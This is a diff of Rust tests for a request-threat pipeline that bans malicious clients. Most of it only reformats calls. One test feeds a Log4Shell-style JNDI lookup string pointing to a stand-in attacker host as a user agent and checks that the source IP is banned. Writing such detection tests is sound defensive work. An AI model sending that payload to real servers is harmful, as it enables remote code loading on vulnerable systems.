@@ -87,15 +87,8 @@ fn test_6_empty_ua_webshell_probe_is_banned() {
 fn test_7_user_agent_jndi_exploit_is_permanently_banned() {
     let pipeline = ThreatPipeline::new_test_instance();
     let ip: IpAddr = "198.51.100.7".parse().unwrap();
-    let action = pipeline.evaluate_request(
-        ip,
-        None,
-        "${jndi:ldap://evil.com/a}",
-        "GET",
-        "/",
-        200,
-        "",
-    );
+    let action =
+        pipeline.evaluate_request(ip, None, "${jndi:ldap://evil.com/a}", "GET", "/", 200, "");
     assert_eq!(
         action,
         PipelineAction::Ban {
@@ -153,7 +146,9 @@ fn test_10_apple_authenticationservicescore_is_allowed() {
 fn test_tool_strike_window_reset() {
     let pipeline = ThreatPipeline::new_test_instance();
     let ip: IpAddr = "198.51.100.20".parse().unwrap();
-    let res1 = pipeline.strike_tracker().record_tool_strike(ip, 10, 10, 100);
+    let res1 = pipeline
+        .strike_tracker()
+        .record_tool_strike(ip, 10, 10, 100);
     assert_eq!(
         res1,
         sanalu::intelligence::StrikeResult::UnderThreshold {
@@ -161,7 +156,9 @@ fn test_tool_strike_window_reset() {
             max: 10,
         }
     );
-    let res2 = pipeline.strike_tracker().record_tool_strike(ip, 10, 10, 120);
+    let res2 = pipeline
+        .strike_tracker()
+        .record_tool_strike(ip, 10, 10, 120);
     assert_eq!(
         res2,
         sanalu::intelligence::StrikeResult::UnderThreshold {
@@ -175,7 +172,9 @@ fn test_tool_strike_window_reset() {
 fn test_tool_strike_cleanup_stale() {
     let pipeline = ThreatPipeline::new_test_instance();
     let ip: IpAddr = "198.51.100.21".parse().unwrap();
-    pipeline.strike_tracker().record_tool_strike(ip, 10, 10, 100);
+    pipeline
+        .strike_tracker()
+        .record_tool_strike(ip, 10, 10, 100);
     assert!(pipeline.strike_tracker().get_record(&ip).is_some());
     pipeline.cleanup_stale_strikes(105, 10);
     assert!(pipeline.strike_tracker().get_record(&ip).is_some());
